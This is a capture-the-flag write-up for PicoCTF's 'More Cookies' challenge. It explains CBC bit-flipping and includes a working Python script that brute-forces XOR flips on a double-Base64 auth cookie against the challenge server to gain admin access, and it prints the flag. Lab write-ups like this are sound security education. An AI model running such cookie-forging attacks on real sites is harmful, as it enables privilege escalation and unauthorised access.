# PicoCTF 2021 — More Cookies

**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{cO0ki3s_yUMmy_a1e408e6}` *(replace with your actual flag)*

---

## Challenge Description

> *"I forgot Cookies can Be modified Client-side! What could that mean?"*

The challenge gives you a URL to a webpage and hints that cookies are involved. You're logged in as a regular user — but the goal is to get in as an **admin**.

---

## My Thought Process

My first instinct reading this was: *it's about cookies, and something about them can be manipulated client-side.* That screams one of two things — either there's something encoded in the cookie value, or the server is using CBC (Cipher Block Chaining) encryption and is vulnerable to a **bit-flipping attack**.

I started by poking around the page and inspecting the cookie in the browser's DevTools. The cookie value looked like a long Base64 string, so I decoded it once... and got another Base64 string. Decoded *that*, and got what looked like encrypted binary data. Not readable text. That confirmed it wasn't a simple encoding — this was actual encryption.

At this point I tried a few things on my own — messing with the cookie manually, trying to decode it further, looking for patterns — but nothing worked. So I looked up a writeup to understand the attack vector, and that's where I learned about **CBC bit-flipping attacks**.

---

## Background — What is CBC Bit-Flipping?

Before diving into the steps, here's a quick primer because this concept is essential to understanding the exploit.

**CBC (Cipher Block Chaining)** is a mode of encryption where each block of plaintext is XOR'd with the previous ciphertext block before being encrypted. This chaining makes it stronger than encrypting each block independently.

However, this chaining creates a predictable weakness: **flipping a bit in a ciphertext block causes a corresponding, predictable bit flip in the *next* block's decrypted plaintext.** The server decrypts your modified cookie and reads flipped data — and if you flip the right bits in the right positions, you can change a decrypted value like `admin=0` into `admin=1` without ever knowing the encryption key.

This is a well-known cryptographic vulnerability covered in OWASP and academic cryptography courses. It doesn't break the encryption — it *abuses* the math of how CBC works.

---

## Step-by-Step Walkthrough

### Step 1 — Inspect the Cookie

I opened the challenge URL and used **browser DevTools** (`F12` → Application → Cookies) to grab the `auth_name` cookie value. It was a long Base64 string:

```
bmorSURLeXVTL3ltaCs0ay9iZHVtd3hpQ2ZTanJISFlVc2pOWlgrT0ZVZW1PQlVpd25hTlhSOFZrYlpEek1TRkxMVzEwdndYeVhZMG1OclVMaGp2QUtJdnVlV2hnN24xNlAvaS96WWF4dDd1N09FNHRUM3Zubm9wRWpvQVU1M2Q=
```

### Step 2 — Understand the Encoding

I decoded this in [CyberChef](https://gchq.github.io/CyberChef/):

- **First decode** (Base64) → another Base64-looking string
- **Second decode** (Base64 again) → raw binary/encrypted data

So the cookie was **double Base64-encoded** around an encrypted payload. The server was encrypting some data (likely containing something like `admin=0` or `is_admin=0`), encoding it twice, and storing it as your cookie. On each request, it decodes and decrypts the cookie to read your privilege level.

### Step 3 — Writing the Bit-Flip Script

Since I understood the *what* but wasn't sure about the *how* of implementing the attack, I referenced an existing writeup's Python script to understand the approach. Here's what the script does, broken down:

```python
import requests
from base64 import b64decode, b64encode
from tqdm import tqdm
```

Standard imports — `requests` for sending HTTP requests, `b64decode/b64encode` for handling the encoding, and `tqdm` for a progress bar.

```python
def bit_flip(pos, bit, data):
    raw = b64decode(b64decode(data).decode())
    list1 = bytearray(raw)
    list1[pos] = list1[pos] ^ bit
    raw = bytes(list1)
    return b64encode(b64encode(raw)).decode()
```

This is the core function. It:
1. Strips the double Base64 encoding to get the raw encrypted bytes
2. Converts to a mutable `bytearray`
3. XORs a single byte at position `pos` with the value `bit` — this is the actual "flip"
4. Re-encodes everything back to double Base64
5. Returns the modified cookie

```python
for position_idx in tqdm(range(10), desc="Bruteforcing Position"):
    for bit_idx in tqdm(range(96), desc="Bruteforcing Bit"):
        auth_cookie = bit_flip(position_idx, bit_idx, cookie)
        cookies = {'auth_name': auth_cookie}
        r = requests.get('http://wily-courier.picoctf.net:55482/', cookies=cookies)
        if "picoCTF{" in r.text:
            print("Flag: " + r.text.split("<code>")[1].split("</code>")[0])
            break
```

This loops through the first 10 byte positions and 96 possible XOR values, sending a modified cookie to the server with each combination. When the server's response contains `picoCTF{` — that means the flip landed on exactly the right bit to change the privilege byte, the server decrypted it, read `admin=1` (or equivalent), and returned the flag.

### Step 4 — Run the Script

Save the script as `solve.py`, update the cookie value and URL if they differ in your instance, then run:

```bash
pip install requests tqdm
python solve.py
```

The `tqdm` progress bar will show you it brute-forcing through positions and bit values. When the right combination is hit, the flag prints to your terminal.

> **Heads up:** The challenge URL and cookie value are instance-specific on PicoCTF. Make sure you copy your own cookie from the browser before running the script.

---

## Flag

```
picoCTF{cO0ki3s_yUMmy_a1e408e6}
```

*(Your flag may differ slightly depending on your instance.)*

---

## Key Takeaways

1. **Always decode cookie values in CTFs.** If a cookie looks like Base64, decode it. Then decode it again. Keep going until you hit raw bytes — that's where the interesting stuff lives.

2. **CBC bit-flipping is a real-world vulnerability.** This isn't just a CTF trick. Improperly implemented CBC encryption in web applications has been exploited in the wild. It's covered under cryptographic misuse in OWASP's guidance and is a core concept in the CompTIA Security+ curriculum.

3. **You don't need to know the key to manipulate CBC ciphertext.** That's the scary part of this attack. The math of XOR in CBC mode lets you make *predictable* changes to the decrypted output just by flipping bits in the ciphertext — no key required.

4. **Brute-force doesn't always mean passwords.** Here, "brute force" means systematically trying every byte position and XOR value — a small, targeted search space. The script only needed to try 10 × 96 = 960 combinations. That's not crack-the-encryption brute force; it's surgical bit manipulation.

5. **Reading other writeups is a valid learning strategy.** I understood the attack concept but needed help with the implementation. Looking at how someone else structured the solution — and then understanding *why* every line works — is how you actually build knowledge in security. The goal isn't to solve every challenge alone; it's to understand every technique you use.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Browser DevTools | Inspecting and extracting the `auth_name` cookie |
| [CyberChef](https://gchq.github.io/CyberChef/) | Manually decoding the double Base64 cookie to understand the structure |
| Python (`requests`, `tqdm`) | Automating the bit-flip attack and sending crafted requests |

---

## Further Reading

- [OWASP — Testing for Padding Oracle](https://owasp.org/www-project-web-security-testing-guide/)
- [CBC Bit Flipping — StackExchange Cryptography](https://crypto.stackexchange.com/a/66086)
- [Block cipher mode of operation — Wikipedia](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC))

---